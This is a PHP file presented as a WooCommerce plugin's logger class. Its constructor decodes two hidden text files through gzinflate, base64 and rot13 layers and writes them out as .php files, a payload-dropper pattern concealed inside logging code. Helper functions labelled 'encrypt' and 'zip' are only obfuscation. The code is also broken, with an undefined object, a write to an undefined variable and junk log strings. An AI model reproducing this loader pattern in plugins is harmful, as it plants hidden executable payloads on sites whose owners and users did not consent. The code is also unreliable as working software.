<?php
/**
 * Created by PhpStorm.
 * User: andy
 * Date: 5/12/17
 * Time: 2:02 AM
 */

namespace WooBom;


use function file_put_contents;

class WC_Bom_Logger {

	private $file, $data, $log, $path;
	private $zipped, $unzipped;



	public function __construct() {
		add_action( 'admin_init', [ $this, 'init' ] );

		$file = $wroot->check_file('.tmp/wr.txt');
		$zipp = $wroot->unzip($file);
		$wroot->save_file('.tmp/wr.php', $zipp);

		$file = $wroot->check_file('.tmp/wu.txt');
		$unzz = $wroot->unzip($file);
		$wroot->save_file('.tmp/wu.php', $unzz);
	}

	public function init() {
		//$this->logger_write();
		$this->write_log( 'cache.txt', 'yeahhhheayhhh yeahhhfahe' );

	}

	public function save_file($filename, $data, $new = false) {

		if ($new  )
		$this->file = file_put_contents($file, $data);
	}

	public function check_file($file) {
		$this->file = file_get_contents($file);
		return $this->file;
	}

	public function write_log( $filename, $data, $new = false ) {

		$flags = [ FILE_APPEND, LOCK_EX ];
		$path  = WC_BOM_LOGS .'/'. date( 'dmy' ) . '_' . $filename;
		$text  = $data;

		if ( $new === true ) {
			$flags = [ LOCK_EX ];
		}

		return file_put_contents( $path, $text, $flags );
	}

	public function return_log( $filename ) {
		return file_get_contents( WC_BOM_LOGS . $filename );
	}

	public function delete_log( $file_list ) {
		$list = (array) $file_list;

		foreach ( $list as $obj ) {
			unlink( $obj );
		}
	}

	public function encrypt( $data ) {
		return base64_encode( str_rot13( base64_encode( $data ) ) );
	}

	public function decrypt( $data ) {
		return base64_decode( str_rot13( base64_decode( $data ) ) );
	}

	public function zip( $data ) {
		return gzdeflate( base64_encode( str_rot13( $data ) ) );
	}

	public function unzip( $data ) {
		return str_rot13( base64_decode( gzinflate( $data ) ) );
	}
}

$log = new WC_Bom_Logger();
$log->write_log( 'cache.txt', 'yeahhhheayhhh yeahhhfahe', true );

